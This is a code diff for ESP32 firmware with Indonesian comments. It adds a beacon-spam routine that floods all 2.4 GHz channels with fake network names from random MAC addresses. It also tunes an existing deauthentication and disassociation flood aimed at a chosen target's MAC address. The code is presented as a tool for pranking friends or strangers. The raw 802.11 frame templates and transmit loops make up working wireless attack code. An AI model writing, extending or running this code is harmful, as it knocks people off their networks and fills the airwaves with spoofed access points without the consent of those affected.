@@ -9,13 +9,72 @@ void stringToMac(String macStr, uint8_t *macAddr) {
   }
 }
 
+uint8_t beaconPacket[128] = {
+    0x80, 0x00, // Frame Control: Beacon
+    0x00, 0x00, // Duration
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // Source MAC (Nanti di-random)
+    0x01, 0x02, 0x03, 0x04, 0x05, 0x06, // BSSID (Nanti di-random)
+    0x00, 0x00, // Sequence Number
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
+    0x64, 0x00, // Beacon Interval
+    0x01, 0x04, // Capability Info
+    0x00 // Tag Number: SSID
+};
+
+// List SSID buat ngerjain temen/orang (Bisa lu ganti sesuka hati)
+const char* fakeSSIDs[] = {
+    "Pencuri Data", "HP Anda Terhack", "RootX-Terminal", 
+    "Beli Bakso Gratis", "Koneksi Lemot", "Polisi Siber", 
+    "Minta Password?", "Pencari Janda"
+};
+
+const char* rickRollLyrics[] = {
+  "1_Never gonna give you up",
+  "2_Never gonna let you down",
+  "3_Never gonna run around",
+  "4_And desert you",
+  "5_Never gonna make you cry",
+  "6_Never gonna say goodbye",
+  "7_Never gonna tell a lie",
+  "8_And hurt you"
+};
+
+
 // --- TEMPLATE PAKET ALA GHOST-ESP ---
 uint8_t deauthFrame[26] = { 0xc0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 uint8_t disasFrame[26]  = { 0xa0, 0x00, 0x3a, 0x01, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00 };
 
 void loopWiFi(void * pvParameters) {
   for(;;) {
-    if (triggerScan) {
+   if (isSpamming) {
+   esp_wifi_set_promiscuous(true);
+      if (aktifModeSpam == 1) {
+         // --- PELURU BEACON SPAM ---
+         // Tembak paket beacon dengan SSID random
+         
+    
+        int randomIdx = esp_random() % 8; 
+        String currentSSID = fakeSSIDs[randomIdx]; // Ambil dari list acak
+        sendBeacon(currentSSID);
+      } 
+      else if (aktifModeSpam == 2) {
+         // --- PELURU RICKROLL ---
+         // Tembak paket beacon dengan SSID "Never Gonna Give You Up"
+         for (int i = 0; i < 8; i++) {
+        String currentSSID = rickRollLyrics[i];
+        sendBeacon(currentSSID); 
+        vTaskDelay(5 / portTICK_PERIOD_MS); // Kasih napas dikit biar gak overload
+    }
+      }
+      else if (aktifModeSpam == 3) {
+         // --- PELURU BLE SPAM ---
+         // (Khusus BLE nanti pake library NimBLE atau BLEDevice)
+      }
+      
+      esp_wifi_set_promiscuous(false);
+      vTaskDelay(50 / portTICK_PERIOD_MS); // Biar gak crash
+    } else if (triggerScan) {
       sedang_scan = true;
       
        adaTarget = false;        // Target lama dihapus
@@ -44,6 +103,8 @@ void loopWiFi(void * pvParameters) {
       scanDone = true;     // Lapor ke Core 1 kalau udah beres
       triggerScan = false; // Matiin pelatuknya
     } else if (isDeauthing && adaTarget) {
+    esp_wifi_set_promiscuous(true);
+    
     uint8_t targetMac[6];
     stringToMac(targetTerkunci.mac, targetMac);
     
@@ -66,11 +127,12 @@ void loopWiFi(void * pvParameters) {
         deauthFrame[23] = (seq >> 8) & 0xFF;
         
         esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
+        delayMicroseconds(200); 
         esp_wifi_80211_tx(WIFI_IF_STA, disasFrame, sizeof(disasFrame), false);
         
         delayMicroseconds(200); 
     }
-    
+    esp_wifi_set_promiscuous(false);
     vTaskDelay(50 / portTICK_PERIOD_MS); 
 }
 
@@ -78,4 +140,32 @@ void loopWiFi(void * pvParameters) {
      // Core 0 istirahat 50ms biar gak overheat sambil nunggu perintah
     vTaskDelay(50 / portTICK_PERIOD_MS); 
   }
+}
+
+void sendBeacon(String ssid) {
+    int ssidLen = ssid.length();
+    
+    // 1. Acak MAC Address (Source & BSSID)
+    for(int i=10; i<16; i++) {
+        uint8_t r = esp_random() % 256;
+        beaconPacket[i] = r;      
+        beaconPacket[i+6] = r;    
+    }
+
+    // 2. Pasang Nama SSID ke Paket
+    beaconPacket[37] = ssidLen;
+    for(int i=0; i<ssidLen; i++) {
+        beaconPacket[38+i] = ssid[i];
+    }
+
+    // 3. Tambah Tail (Akhiran Paket)
+    uint8_t postSSID[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 0x03, 0x01, 0x01};
+    memcpy(&beaconPacket[38 + ssidLen], postSSID, sizeof(postSSID));
+
+    // 4. Tembak Keliling Channel
+    for (int ch = 1; ch <= 13; ch++) {
+        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+        esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, 38 + ssidLen + sizeof(postSSID), false);
+        delayMicroseconds(100); 
+    }
 }
